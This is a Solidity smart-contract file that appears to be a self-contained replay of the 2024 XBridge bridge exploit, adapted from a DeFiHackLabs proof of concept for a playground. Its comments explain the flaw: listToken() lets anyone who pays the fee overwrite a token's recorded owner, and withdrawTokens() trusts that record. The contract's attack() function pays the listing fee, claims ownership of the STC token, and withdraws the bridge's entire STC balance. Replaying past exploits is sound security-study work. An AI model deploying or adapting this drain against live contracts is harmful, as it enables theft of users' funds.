// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-XBridge).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (testExploit() calls xbridge.listToken() / withdrawTokens() directly as
// address(this) — there is no standalone exploit contract to deploy). This
// contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record attack(). Logic and constants are copied
// verbatim from test/XBridge_exp.sol.
//
// Root cause: XBridge's listToken() is public and fee-gated only, and as a side
// effect unconditionally overwrites the global _tokenOwner[token] map whenever
// the token has code — even if that token is already owned by a real, unrelated
// lister who deposited it under a different (chain, chain) pair. withdrawTokens()
// trusts only that map plus the vault's live balance, so the newly self-appointed
// "owner" can withdraw every unit of that token the bridge holds.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IXbridge {
    struct tokenInfo {
        address token;
        uint256 chain;
    }

    function listToken(
        tokenInfo memory baseToken,
        tokenInfo memory correspondingToken,
        bool _isMintable
    ) external payable;
    function withdrawTokens(address token, address receiver, uint256 amount) external;
}

contract XBridgeDrain {
    IERC20 private constant STC = IERC20(0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A);
    IXbridge private constant xbridge = IXbridge(0x47Ddb6A433B76117a98FBeAb5320D8b67D468e31);

    // step 0: pay the 0.15 ETH listing fee, hijacking _tokenOwner[STC] for two
    // fresh, never-before-used chain IDs (85936 / 95838) so the uniqueness
    // require passes even though STC is already owned by a real lister under a
    // different chain pair.
    // step 1: withdraw the bridge's entire STC balance now that this contract
    // is (wrongly) recognized as STC's owner.
    function attack() external payable {
        IXbridge.tokenInfo memory base = IXbridge.tokenInfo(address(STC), 85_936);
        IXbridge.tokenInfo memory corr = IXbridge.tokenInfo(address(STC), 95_838);

        xbridge.listToken{value: msg.value}(base, corr, false);

        xbridge.withdrawTokens(address(STC), address(this), STC.balanceOf(address(xbridge)));
    }

    receive() external payable {}
}
